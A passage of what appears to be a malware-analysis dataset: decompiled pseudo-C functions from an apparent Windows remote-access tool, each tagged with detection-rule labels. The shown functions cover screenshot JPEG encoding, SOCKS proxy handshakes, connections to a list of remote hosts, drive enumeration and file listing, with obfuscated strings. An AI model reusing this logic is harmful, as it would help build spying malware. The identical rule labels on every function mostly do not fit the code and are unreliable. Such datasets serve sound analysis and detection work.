4) = cVar3;\n            *(iVar14 + 2 + iVar10 * 4) = iVar6 + -1 + iVar10;\n        }\n        cVar3 = cVar3 + '\\x01';\n        iVar10 = iVar11 * 2;\n        iVar6 = iVar6 * 2;\n        iVar11 = iVar10;\n    } while (cVar3 != '\\x10');\n    if (((*param_1 == 'B') && (param_1[1] == 'M')) && (param_1[0x1c] == '\\x18')) {\n        *0x42e200 = param_3;\n        uVar12 = param_3 & 0xffff;\n        *0x42e202 = param_4;\n        if ((param_3 & 7) != 0) {\n            uVar12 = (param_3 >> 3 & 0x1fff) * 8 + 8;\n        }\n        uVar4 = param_4 & 0xffff;\n        if ((param_4 & 7) != 0) {\n            uVar4 = (param_4 >> 3 & 0x1fff) * 8 + 8;\n        }\n        iVar10 = uVar4 * uVar12 * 3;\n        if ((iVar10 - *0x4281e0 != 0) || (*0x4281e4 == 0)) {\n            *0x4281e0 = iVar10;\n            if (*0x4281e4 != 0) {\n                fcn.00407f59(0x4281e4);\n            }\n            *0x4281e4 = sub.msvcrt.dll_malloc(iVar10);\n            if (*0x4281e4 == 0) {\n                return 0;\n            }\n        }\n        iVar10 = *0x4281e4;\n        uVar12 = param_3;\n        if (param_3 < 0) {\n            uVar12 = 0;\n        }\n        iVar6 = 0;\n        iVar14 = 0;\n        for (iStack68 = 0; iStack68 < param_4; iStack68 = iStack68 + 1) {\n            iStack72 = 0;\n            pcVar5 = iVar14 * 3 + iVar10;\n            pcVar7 = param_1 + iVar6;\n            while (iStack72 < param_3) {\n                iStack72 = iStack72 + 1;\n                *pcVar5 = pcVar7[0x36];\n                pcVar5[1] = pcVar7[0x37];\n                pcVar5[2] = pcVar7[0x38];\n                pcVar5 = pcVar5 + 3;\n                pcVar7 = pcVar7 + 3;\n            }\n            iVar14 = iVar14 + uVar12;\n            iVar6 = iVar6 + uVar12 * 3 + (param_3 * -3 & 3);\n        }\n        if (param_6 != '\\0') {\n            iVar6 = (param_4 - 1) * param_3 * 3 + iVar10;\n            for (iVar14 = 0; iVar14 < param_4 >> 1; iVar14 = iVar14 + 1) {\n                for (iVar8 = 0; iVar8 < param_3 * 3; iVar8 = iVar8 + 1) {\n                    uVar2 = *(iVar10 + iVar8);\n                    *(iVar10 + iVar8) = *(iVar6 + iVar8);\n                    *(iVar6 + iVar8) = uVar2;\n                }\n                iVar10 = iVar10 + param_3 * 3;\n                iVar6 = iVar6 + param_3 * -3;\n            }\n        }\n        *0x428008 = sub.msvcrt.dll_malloc(*param_2);\n        uVar13 = *0x42e202;\n        uVar9 = *0x42e200;\n        if (*0x428008 != 0) {\n            iVar6 = 0x42b260;\n            *0x42206c = *0x42e200;\n            *0x42206a = *0x42e202;\n            fcn.00404125(0xffd8);\n            fcn.00404125(5);\n            fcn.00404125(0x10);\n            fcn.0040410c(0x4a);\n            fcn.0040410c(0x46);\n            fcn.0040410c(0x49);\n            fcn.0040410c(0x46);\n            fcn.0040410c(0);\n            fcn.0040410c(1);\n            fcn.0040410c(1);\n            fcn.0040410c(0);\n            fcn.00404125(1);\n            fcn.00404125(1);\n            fcn.0040410c(0);\n            fcn.0040410c(0);\n            fcn.00404125(*0x42b260);\n            fcn.00404125(*0x42b262);\n            fcn.0040410c(*0x42b264);\n            iVar10 = 0x42b260;\n            do {\n                fcn.0040410c(*(iVar10 + 5));\n                iVar10 = iVar10 + 1;\n            } while (iVar10 != 0x42b2a0);\n            fcn.0040410c(*0x42b2a5);\n            do {\n                puVar1 = iVar6 + 0x46;\n                iVar6 = iVar6 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar6 != 0x42b2a0);\n            fcn.00404125(*0x422064);\n            fcn.00404125(*0x422066);\n            fcn.0040410c(*0x422068);\n            fcn.00404125(uVar13);\n            iVar10 = 0x42b0a0;\n            fcn.00404125(uVar9);\n            iVar6 = 0x42b0a0;\n            fcn.0040410c(*0x42206e);\n            fcn.0040410c(*0x42206f);\n            fcn.0040410c(*0x422070);\n            fcn.0040410c(*0x422071);\n            fcn.0040410c(*0x422072);\n            fcn.0040410c(*0x422073);\n            fcn.0040410c(*0x422074);\n            fcn.0040410c(*0x422075);\n            fcn.0040410c(*0x422076);\n            fcn.0040410c(*0x422077);\n            fcn.00404125(*0x42b0a0);\n            fcn.00404125(*0x42b0a2);\n            fcn.0040410c(*0x42b0a4);\n            do {\n                puVar1 = iVar6 + 5;\n                iVar6 = iVar6 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar6 != 0x42b0b0);\n            iVar6 = 0x42b0a0;\n            do {\n                puVar1 = iVar6 + 0x15;\n                iVar6 = iVar6 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar6 != 0x42b0ac);\n            iVar6 = 0x42b0a0;\n            fcn.0040410c(*0x42b0c1);\n            do {\n                puVar1 = iVar6 + 0x22;\n                iVar6 = iVar6 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar6 != 0x42b0b0);\n            iVar6 = 0x42b0a0;\n            do {\n                fcn.0040410c(*(iVar6 + 0x32));\n                iVar6 = iVar6 + 1;\n            } while (iVar6 != 0x42b142);\n            fcn.0040410c(*0x42b174);\n            iVar6 = 0x42b0a0;\n            do {\n                fcn.0040410c(*(iVar6 + 0xd5));\n                iVar6 = iVar6 + 1;\n            } while (iVar6 != 0x42b0b0);\n            iVar6 = 0x42b0a0;\n            do {\n                fcn.0040410c(*(iVar6 + 0xe5));\n                iVar6 = iVar6 + 1;\n            } while (iVar6 != 0x42b0ac);\n            iVar6 = 0x42b0a0;\n            fcn.0040410c(*0x42b191);\n            do {\n                puVar1 = iVar6 + 0xf2;\n                iVar6 = iVar6 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar6 != 0x42b0b0);\n            do {\n                puVar1 = iVar10 + 0x102;\n                iVar10 = iVar10 + 1;\n                fcn.0040410c(*puVar1);\n            } while (iVar10 != 0x42b142);\n            fcn.00404125(0xffda);\n            fcn.00404125(0xc);\n            fcn.0040410c(3);\n            fcn.0040410c(1);\n            fcn.0040410c(0);\n            fcn.0040410c(2);\n            fcn.0040410c(0x11);\n            fcn.0040410c(3);\n            fcn.0040410c(0x11);\n            fcn.0040410c(0);\n            fcn.0040410c(0x3f);\n            fcn.0040410c(0);\n            *0x42b090 = 0;\n            *0x422060 = '\\a';\n            uStack34 = 0;\n            uStack32 = 0;\n            auStack30[0] = 0;\n            for (uVar9 = 0; uVar9 < *0x42e202; uVar9 = uVar9 + 8) {\n                for (uVar13 = 0; uVar13 < *0x42e200; uVar13 = uVar13 + 8) {\n                    fcn.004048f3(uVar13, uVar9);\n                    fcn.0040478e(0x4281a0, 0x428300, &uStack34, 0x42b060, 0x42ac20);\n                    fcn.0040478e(0x428160, 0x428200, &uStack32, 0x42b020, 0x42a820);\n                    fcn.0040478e(0x428120, 0x428200, auStack30, 0x42b020, 0x42a820);\n                }\n            }\n            if (-1 < *0x422060) {\n                fcn.004042c8(((1 << (*0x422060 + 1U & 0x1f)) + -1) * 0x10000 | *0x422060 + 1U);\n            }\n            fcn.00404125(0xffd9);\n            *param_2 = *0x428004;\n            return *0x428008;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3152
    },
    "004058e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004058e9(char *param_1, int32_t *param_2, char *param_3, uint32_t param_4)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uchar *puStack1080;\n    uint uStack1076;\n    uint uStack1072;\n    char *pcStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint32_t uStack1056;\n    uchar uStack1040;\n    uchar uStack1039;\n    uchar uStack1038;\n    uint uStack912;\n    char *pcStack908;\n    uchar *puStack904;\n    char *pcStack900;\n    uchar *puStack896;\n    uint uStack884;\n    char *pcStack880;\n    uchar *puStack876;\n    uint uStack872;\n    uint uStack868;\n    char *pcStack864;\n    char *pcStack860;\n    int32_t iStack856;\n    uint uStack852;\n    uchar auStack828 [8];\n    uint uStack820;\n    char *pcStack816;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uchar *puStack580;\n    uint uStack576;\n    char *pcStack572;\n    uchar *puStack568;\n    uint uStack564;\n    uint uStack560;\n    char *pcStack556;\n    uchar *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uint32_t uStack540;\n    uint uStack536;\n    uint32_t uStack532;\n    uchar auStack524 [128];\n    uint uStack396;\n    char *pcStack392;\n    uchar *puStack388;\n    char *pcStack384;\n    uchar *puStack380;\n    uint uStack368;\n    uint uStack364;\n    uchar *puStack360;\n    uint uStack356;\n    uint uStack352;\n    char *pcStack348;\n    uchar *puStack344;\n    uchar *puStack340;\n    uint uStack336;\n    uchar auStack317 [20];\n    uchar uStack297;\n    uchar uStack296;\n    uchar auStack295 [2];\n    uchar auStack293 [4];\n    uchar uStack289;\n    uint uStack288;\n    char *pcStack284;\n    char *pcStack24;\n    ushort uStack20;\n    \n    pcStack1068 = param_1;\n    uStack544 = param_3;\n    uStack532 = param_4;\n    iVar4 = *param_2;\n    if (iVar4 == 1) {\n        uVar6 = 0xffffffff;\n        do {\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            cVar1 = *param_3;\n            param_3 = param_3 + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = ~uVar6 + 9;\n        if (iVar4 < 0x201) {\n            uStack852 = 0x200;\n            iStack856 = 0;\n            pcStack864 = 0x4054fe;\n            pcStack860 = &stack0xfffffde4;\n            fcn.004129e4();\n            pcStack860 = param_4 & 0xffff;\n            uStack540 = uStack540 & 0xffff0000 | 0x104;\n            pcStack864 = 0x40551e;\n            uVar2 = sub.WS2_32.dll_htons();\n            uStack820 = CONCAT22(uVar2, uStack820);\n            pcStack860 = &stack0xfffffcce;\n            iStack856 = 2;\n            pcStack864 = &stack0xfffffde2;\n            uStack868 = 0x405543;\n            fcn.00412aa3();\n            pcStack860 = &stack0xfffffcd0;\n            iStack856 = 4;\n            pcStack816 = 0x1000000;\n            pcStack864 = &stack0xfffffde4;\n            uStack868 = 0x40556a;\n            fcn.00412aa3();\n            uStack536 = uStack536 & 0xffffff00;\n            uVar7 = 0xffffffff;\n            pcVar8 = param_1;\n            do {\n                if (uVar7 == 0) break;\n                uVar7 = uVar7 - 1;\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            iStack856 = ~uVar7 - 1;\n            pcStack864 = &stack0xfffffde9;\n            uStack868 = 0x4055a1;\n            pcStack860 = pcStack1068;\n            fcn.00412aa3();\n            (&stack0xfffffde9)[~uVar6] = 0;\n            uStack852 = 0;\n            uStack868 = 0x4055c1;\n            pcStack864 = pcStack1068;\n            pcStack860 = &stack0xfffffde4;\n            iStack856 = iVar4;\n            iVar5 = sub.WS2_32.dll_send();\n            if (iVar4 == iVar5) {\n                uStack872 = 8;\n                puStack876 = NULL;\n                puStack896 = &stack0xfffffccc;\n                uStack884 = 0x4055ec;\n                pcStack880 = &stack0xfffffcc4;\n                fcn.004129e4();\n                pcStack880 = param_1 + 1;\n                pcStack864 = NULL;\n                uStack868 = 0;\n                uStack872 = 0;\n                uStack820 = 1;\n                uStack884 = 0x40561f;\n                puStack876 = puStack896;\n                pcStack816 = pcStack1068;\n                iVar4 = sub.WS2_32.dll_select();\n                if (0 < iVar4) {\n                    puStack904 = 0x405636;\n                    pcStack900 = pcStack1068;\n                    iVar4 = sub.WS2_32.dll___WSAFDIsSet();\n                    if (iVar4 != 0) {\n                        puStack896 = NULL;\n                        pcStack900 = 0x8;\n                        uStack912 = 0x40565c;\n                        pcStack908 = pcStack1068;\n                        puStack904 = &stack0xfffffcc4;\n                        iVar4 = sub.WS2_32.dll_recv();\n                        if (iVar4 == 8) {\n                            return uStack872._1_1_ == 'Z';\n                        }\n                    }\n                }\n            }\n        }\n        return false;\n    }\n    if (iVar4 == 0) {\n        puStack340 = &stack0xfffffee0;\n        uStack352 = 0x40535a;\n        pcStack348 = uStack544;\n        puStack344 = uStack532;\n        cVar1 = fcn.004051b5();\n        if (cVar1 != '\\0') {\n            puStack340 = 0x9;\n            puStack344 = NULL;\n            uStack352 = 0x405381;\n            pcStack348 = &stack0xfffffed7;\n            fcn.004129e4();\n            puStack344 = &stack0xfffffee2;\n            puStack340 = 0x2;\n            uStack297 = 4;\n            uStack296 = 1;\n            pcStack348 = &stack0xfffffed9;\n            uStack352 = 0x4053a7;\n            fcn.00412aa3();\n            puStack344 = &stack0xfffffee4;\n            puStack340 = 0x4;\n            pcStack348 = &stack0xfffffedb;\n            uStack352 = 0x4053c3;\n            fcn.00412aa3();\n            uStack336 = 0;\n            puStack340 = 0x9;\n            uStack289 = 0;\n            uStack352 = 0x4053e4;\n            pcStack348 = pcStack1068;\n            puStack344 = &stack0xfffffed7;\n            iVar4 = sub.WS2_32.dll_send();\n            if (iVar4 == 9) {\n                uStack356 = 4;\n                puStack360 = NULL;\n                puStack380 = &stack0xfffffee0;\n                uStack368 = 0x405410;\n                uStack364 = &stack0xfffffec3;\n                fcn.004129e4();\n                uStack364 = param_1 + 1;\n                pcStack348 = NULL;\n                uStack352 = 0;\n                uStack356 = 0;\n                uStack288 = 1;\n                uStack368 = 0x405443;\n                puStack360 = puStack380;\n                pcStack284 = pcStack1068;\n                iVar4 = sub.WS2_32.dll_select();\n                if (0 < iVar4) {\n                    puStack388 = 0x40545a;\n                    pcStack384 = pcStack1068;\n                    iVar4 = sub.WS2_32.dll___WSAFDIsSet();\n                    if (iVar4 != 0) {\n                        puStack380 = NULL;\n                        pcStack384 = 0x4;\n                        uStack396 = 0x405480;\n                        pcStack392 = pcStack1068;\n                        puStack388 = &stack0xfffffec3;\n                        iVar4 = sub.WS2_32.dll_recv();\n                        if (iVar4 == 4) {\n                            if (uStack364._3_1_ != '\\0') {\n                                return false;\n                            }\n                            return puStack360 == 'Z';\n                        }\n                    }\n                }\n            }\n        }\n        return false;\n    }\n    if (iVar4 != 2) {\n        if (iVar4 != 3) {\n            return true;\n        }\n        pcStack556 = \"PTLLjPq %6:%S -qq9/G.y\";\n        uStack560 = 0x40583b;\n        iStack548 = fcn.004081aa();\n        puStack580 = &stack0xfffffdf4;\n        puStack552 = 0x200;\n        uStack560 = 0x405863;\n        pcStack556 = puStack580;\n        uStack540 = uStack532;\n        uStack536 = uStack544;\n        iVar4 = fcn.004127a8();\n        uStack544 = NULL;\n        uStack560 = 0x40587d;\n        pcStack556 = pcStack1068;\n        puStack552 = puStack580;\n        iStack548 = iVar4;\n        iVar5 = sub.WS2_32.dll_send();\n        if (iVar4 == iVar5) {\n            uStack564 = 0x200;\n            puStack568 = NULL;\n            uStack576 = 0x4058a0;\n            pcStack572 = puStack580;\n            fcn.004129e4();\n            uStack560 = 0;\n            uStack564 = 0x200;\n            uStack576 = 0x4058bc;\n            pcStack572 = pcStack1068;\n            puStack568 = puStack580;\n            iVar4 = sub.WS2_32.dll_recv();\n            if (0 < iVar4) {\n                uStack584 = 0x422ee8;\n                uStack588 = 0;\n                uStack592 = 0x4058db;\n                iVar4 = fcn.004125de();\n                return iVar4 != -1;\n            }\n        }\n        return false;\n    }\n    uStack1064 = &stack0xfffffbf0;\n    uStack1056 = 0;\n    uStack1060 = 3;\n    uStack1040 = 5;\n    uStack1039 = 1;\n    uStack1038 = 0;\n    uStack1072 = 0x4056ba;\n    iVar4 = sub.WS2_32.dll_send();\n    if (iVar4 == (uStack1056 >> 8 & 0xff) + 2) {\n        uStack1076 = 2;\n        puStack1080 = NULL;\n        fcn.004129e4(&stack0xfffffbde);\n        uStack1072 = 0;\n        uStack1076 = 2;\n        puStack1080 = &stack0xfffffbde;\n        iVar4 = sub.WS2_32.dll_recv(param_1);\n        if (((iVar4 == 2) && (uStack1076._2_1_ == '\\x05')) && (uStack1076._3_1_ == '\\0')) {\n            uVar6 = 0xffffffff;\n            pcVar8 = pcStack24;\n            do {\n                if (uVar6 == 0) break;\n                uVar6 = uVar6 - 1;\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            pcStack1068 = 0x3000105;\n            uVar7 = ~uVar6 - 1 & 0xff;\n            uStack1064 = uStack1064 & 0xffffff00 | ~uVar6 - 1 & 0xff;\n            fcn.00412aa3(&stack0xfffffbd9, pcStack24, uVar7);\n            uVar3 = sub.WS2_32.dll_htons(uStack20);\n            puStack1080 = puStack1080 & 0xffff0000 | uVar3;\n            iVar5 = uVar7 + 7;\n            fcn.00412aa3(&stack0xfffffbd9 + uVar7, &stack0xfffffbc8, 2);\n            iVar4 = sub.WS2_32.dll_send(param_1, &stack0xfffffbd4, iVar5, 0);\n            if ((iVar5 == iVar4) && (iVar4 = sub.WS2_32.dll_recv(param_1, &stack0xfffffdc0, iVar5, 0),  -1 < iVar4)) {\n                if (uStack592 != '\\x05') {\n                    return false;\n                }\n                return uStack592._1_1_ == '\\0';\n            }\n        }\n    }\n    return false;\n}\n",
        "token_count": 3151
    },
    "004059d3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.004059d3(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack60;\n    uint uStack48;\n    uchar auStack44 [28];\n    \n    uStack48 = 0xffffffff;\n    iVar2 = fcn.00408e53();\n    if (iVar2 == 4) {\n        if (*0x42b300 == 0) {\n            *0x42b300 = *0x42b304;\n        }\n        do {\n            if (*0x42b300 == 0) {\n                return uStack72;\n            }\n            cVar1 = fcn.004051b5(*0x42b300 + 4, *(*0x42b300 + 0x44), auStack44);\n            if (cVar1 != '\\0') {\n                uVar3 = sub.WS2_32.dll_socket(2, 1, 0);\n                iVar2 = sub.WS2_32.dll_connect(uVar3, auStack44, 0x10);\n                if ((iVar2 == 0) && (cVar1 = fcn.004058e9(),  cVar1 != '\\0')) goto code_r0x00405aae;\n                fcn.00405999();\n            }\n            *0x42b300 = *(*0x42b300 + 0x88);\n        } while( true );\n    }\n    iVar2 = fcn.00408e53();\n    if (iVar2 == 2) {\n        if (*0x42b300 == 0) {\n            *0x42b300 = *0x42b304;\n        }\n        do {\n            if (*0x42b300 == 0) {\n                return uStack72;\n            }\n            cVar1 = fcn.004051b5(*0x42b300 + 4, *(*0x42b300 + 0x44), auStack44);\n            if (cVar1 != '\\0') {\n                uVar3 = sub.WS2_32.dll_socket(2, 1, 0);\n                iVar2 = sub.WS2_32.dll_connect(uVar3, auStack44, 0x10);\n                if ((iVar2 == 0) && (cVar1 = fcn.004058e9(),  cVar1 != '\\0')) {\n                    return uStack72;\n                }\n                fcn.00405999();\n            }\n            *0x42b300 = *(*0x42b300 + 0x88);\n        } while( true );\n    }\n    uStack72 = param_2;\n    puStack68 = auStack44;\n    cVar1 = fcn.004051b5(param_1);\n    if (cVar1 == '\\0') {\n        return 0xffffffff;\n    }\n    puStack68 = 0x6;\n    uStack72 = 1;\n    iStack60 = sub.WS2_32.dll_socket(2);\n    if (iStack60 == -1) {\n        return 0xffffffff;\n    }\n    iVar2 = sub.WS2_32.dll_connect(iStack60, auStack44, 0x10);\n    if (iVar2 == 0) {\n        return uStack72;\n    }\ncode_r0x00405af8:\n    fcn.00405999(&uStack72);\n    return 0xffffffff;\ncode_r0x00405aae:\n    do {\n        *0x42b300 = *(*0x42b300 + 0x88);\n        if (*0x42b300 == 0) {\n            return uStack72;\n        }\n        cVar1 = fcn.004058e9();\n    } while (cVar1 != '\\0');\n    goto code_r0x00405af8;\n}\n",
        "token_count": 850
    },
    "00405d7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00405d7d(uchar param_1, uint param_2, char *param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t unaff_retaddr;\n    \n    if (param_3 == NULL) {\n        param_4 = 0;\n    }\n    else {\n        pcVar8 = param_3;\n        if (param_4 == 0xffffffff) {\n            do {\n                if (param_4 == 0) break;\n                param_4 = param_4 - 1;\n                cVar3 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar3 != '\\0');\n            param_4 = ~param_4 - 1;\n        }\n    }\n    sub.KERNEL32.dll_EnterCriticalSection(0x42b314);\n    cVar3 = fcn.00405cc4(unaff_retaddr, 0x2d);\n    if (cVar3 != '\\0') {\n        uVar1 = param_4 + 5;\n        if (*0x42b310 < uVar1) {\n            if (*0x42b30c != NULL) {\n                fcn.00407f59(0x42b30c);\n            }\n            *0x42b30c = sub.msvcrt.dll_malloc(uVar1);\n            *0x42b310 = uVar1;\n        }\n        if (*0x42b30c != NULL) {\n            if (0 < param_4) {\n                if (unaff_retaddr == *0x422844) {\n                    fcn.00403cb2(0x42e2a0, 0x42e280, param_3, *0x42b30c + 5, param_4, 0);\n                }\n                else {\n                    fcn.00412aa3(*0x42b30c + 5, param_3, param_4);\n                }\n            }\n            piVar2 = *0x42b30c;\n            iVar7 = -1;\n            **0x42b30c = param_4 + 1;\n            *(piVar2 + 1) = param_1;\n            uVar5 = 0;\n            uVar6 = uVar1;\n            while (uVar5 < uVar1) {\n                iVar7 = sub.WS2_32.dll_send(unaff_retaddr, *0x42b30c + uVar5, uVar6, 0);\n                if (iVar7 == -1) {\n                    iVar4 = sub.WS2_32.dll_WSAGetLastError();\n                    if (iVar4 != 0x2733) break;\n                    fcn.00407ef4();\n                }\n                else {\n                    uVar5 = uVar5 + iVar7;\n                    uVar6 = uVar6 - iVar7;\n                }\n            }\n            goto code_r0x00405ec5;\n        }\n    }\n    uVar5 = 0;\n    iVar7 = -1;\ncode_r0x00405ec5:\n    sub.KERNEL32.dll_LeaveCriticalSection(0x42b314);\n    if ((uVar5 == 0) || (iVar4 = uVar5 - 5,  iVar7 == -1)) {\n        iVar4 = -1;\n    }\n    return iVar4;\n}\n",
        "token_count": 784
    },
    "00406084": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406084(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint unaff_EDI;\n    uint uVar4;\n    uchar auStack824 [8];\n    uchar auStack816 [20];\n    uint uStack796;\n    char cStack792;\n    uint auStack772 [3];\n    uchar auStack760 [16];\n    uchar auStack744 [72];\n    char acStack672 [656];\n    \n    fcn.0041236c(auStack760, 0x8000);\n    sub.KERNEL32.dll_SetErrorMode(1);\n    pcVar3 = acStack672;\n    iVar1 = sub.KERNEL32.dll_GetLogicalDriveStringsA(0x80, pcVar3);\n    if (iVar1 != 0) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 4) {\n            fcn.004129e4(auStack744, 0, 0x40);\n            fcn.004129e4(auStack760, 0, 0x10);\n            uStack796 = 0;\n            iVar1 = sub.KERNEL32.dll_GetVolumeInformationA(pcVar3, auStack744, 0x40, 0, 0, &uStack796, auStack760, 0x10)\n            ;\n            if (iVar1 == 0) {\n                fcn.004129e4(auStack744, 0, 0x40);\n                fcn.004129e4(auStack760, 0, 0x10);\n            }\n            sub.KERNEL32.dll_GetDiskFreeSpaceExA(pcVar3, auStack824, auStack816, 0);\n            if (cStack792 == '\\0') {\n                uVar2 = fcn.004081aa(\"mWYCi a46w\");\n                fcn.00412548(auStack744, uVar2, 0x40);\n            }\n            sub.KERNEL32.dll_GetDriveTypeA(pcVar3);\n            iVar1 = fcn.004127a8();\n            if (0 < iVar1) {\n                fcn.00412458();\n            }\n        }\n    }\n    iVar1 = fcn.00412540(auStack772);\n    if (iVar1 < 1) {\n        uVar2 = 0;\n        auStack772[0] = 0;\n        uVar4 = 0xea;\n    }\n    else {\n        uVar2 = fcn.00412540(auStack772);\n        uVar4 = 0xe9;\n    }\n    fcn.00405d7d(unaff_EDI, uVar4, auStack772[0], uVar2);\n    fcn.004123b1(auStack772);\n    return;\n}\n",
        "token_count": 614
    },
    "00406304": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00406304(void)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    char *pcVar6;\n    char **ppcVar7;\n    char **ppcVar8;\n    uint auStack20 [2];\n    \n    auStack20[1] = 0x406311;\n    iVar4 = fcn.0041f3f0();\n    iVar4 = -iVar4;\n    pcVar1 = &stack0x00000004 + iVar4;\n    *(&stack0xfffffff4 + iVar4) = 0x1000;\n    uVar2 = *(&stack0x00001014 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = pcVar1;\n    *(&stack0xfffffff0 + iVar4) = 0x406330;\n    iVar5 = sub.KERNEL32.dll_GetLogicalDriveStringsA();\n    *(&stack0xfffffff0 + iVar4) = extraout_ECX;\n    ppcVar7 = &stack0xffffffec + iVar4;\n    *(&stack0xffffffec + iVar4) = extraout_ECX;\n    pcVar6 = pcVar1;\n    if (iVar5 == 0) {\n        *(&stack0xfffffff8 + iVar4) = 0;\n        *(&stack0xfffffff4 + iVar4) = 0;\n        *(&stack0xfffffff0 + iVar4) = 0xa5;\n        ppcVar7 = &stack0xffffffec + iVar4;\n    }\n    else {\n        for (; *pcVar6 != '\\0'; pcVar6 = pcVar6 + 4) {\n            *ppcVar7 = pcVar6;\n            ppcVar7[-1] = 0x406364;\n            cVar3 = sub.KERNEL32.dll_GetDriveTypeA();\n            ppcVar8 = ppcVar7 + -1;\n            ppcVar7 = ppcVar7 + -1;\n            *ppcVar8 = extraout_EDX;\n            pcVar6[2] = cVar3;\n            pcVar6[3] = '\\a';\n        }\n        ppcVar7[3] = pcVar6 + -pcVar1;\n        ppcVar7[2] = pcVar1;\n        ppcVar7[1] = 0xa4;\n    }\n    *ppcVar7 = uVar2;\n    ppcVar7[-1] = 0x406386;\n    fcn.00405d7d();\n    return;\n}\n",
        "token_count": 596
    },
    "00406453": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406453(uint param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint *puVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uStack2620;\n    uint uStack2616;\n    uint uStack2612;\n    uint uStack2608;\n    uchar *puStack2604;\n    uint uStack2600;\n    uchar auStack2580 [12];\n    uchar auStack2568 [4];\n    ushort uStack2564;\n    ushort uStack2562;\n    ushort uStack2558;\n    ushort uStack2556;\n    ushort uStack2554;\n    uint auStack2548 [4];\n    uint auStack2532 [7];\n    uchar auStack2504 [32];\n    uchar auStack2472 [228];\n    uchar auStack2244 [516];\n    uint auStack1728 [8];\n    uint8_t uStack1696;\n    uchar auStack1680 [12];\n    uint uStack1668;\n    uchar *puStack1664;\n    uchar auStack1652 [592];\n    uchar auStack1060 [1028];\n    int32_t aiStack32 [4];\n    \n    uStack2600 = 0x204;\n    uStack2608 = 0x204;\n    uStack2616 = 0;\n    uStack2620 = 0xfde9;\n    uStack2612 = param_1;\n    puStack2604 = auStack1060;\n    sub.KERNEL32.dll_MultiByteToWideChar();\n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar3 = sub.KERNEL32.dll_FindFirstFileW(auStack1060, auStack1680);\n    if (iVar3 == -1) {\n        fcn.00405d7d(*(aiStack32[0] + 0x208), *(aiStack32[0] + 0x205), 0, 0);\n    }\n    else {\n        cVar2 = fcn.0041236c(auStack2580, 0x8000);\n        if ((cVar2 != '\\0') && (cVar2 = fcn.0041236c(auStack2568, 0x8000),  cVar2 != '\\0')) {\n            do {\n                sub.KERNEL32.dll_FileTimeToSystemTime(&uStack1668, &uStack2556);\n                puVar4 = 0x4222c0;\n                puVar7 = auStack2532;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar7 = puVar7 + 1;\n                }\n                fcn.004127a8(auStack2504, 0x20, auStack2532, uStack2558, 